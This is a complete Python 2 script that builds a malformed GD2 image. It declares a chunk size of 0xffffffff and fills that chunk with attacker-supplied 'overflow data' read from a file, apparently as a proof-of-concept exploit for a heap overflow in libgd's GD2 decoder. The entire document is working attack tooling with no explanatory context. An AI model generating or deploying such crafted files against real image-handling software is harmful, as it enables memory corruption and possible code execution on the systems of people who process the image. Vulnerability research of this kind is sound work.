#!/usr/bin/env python2

import sys
import zlib
from struct import pack


# gd.h: #define gdMaxColors 256
gd_max_colors = 256


def make_gd2(chunks):
    gd2 = [
        "gd2\x00",                    # signature
        pack(">H", 2),                # version
        pack(">H", 1),                # image size (x)
        pack(">H", 1),                # image size (y)
        pack(">H", 0x40),             # chunk size (0x40 <= cs <= 0x80)
        pack(">H", 2),                # format (GD2_FMT_COMPRESSED)
        pack(">H", 1),                # num of chunks wide
        pack(">H", len(chunks))       # num of chunks high
    ]
    colors = [
        pack(">B", 0),                # trueColorFlag
        pack(">H", 0),                # im->colorsTotal
        pack(">I", 0),                # im->transparent
        pack(">I", 0) * gd_max_colors  # red[i], green[i], blue[i], alpha[i]
    ]

    offset = len("".join(gd2)) + len("".join(colors)) + len(chunks) * 8
    for data, size in chunks:
        gd2.append(pack(">I", offset))  # cidx[i].offset
        gd2.append(pack(">I", size))   # cidx[i].size
        offset += size

    return "".join(gd2 + colors + [data for data, size in chunks])


def get_overflow_data(path):
    with open(path) as fd:
        return fd.read()


def main():
    overflow_data = get_overflow_data(sys.argv[1])
    valid = zlib.compress("A" * 100, 0)
    gd2 = make_gd2([(valid, len(valid)), (overflow_data, 0xffffffff)])

    with open(sys.argv[2], 'w') as fd:
        fd.write(gd2)


if __name__ == "__main__":
    main()
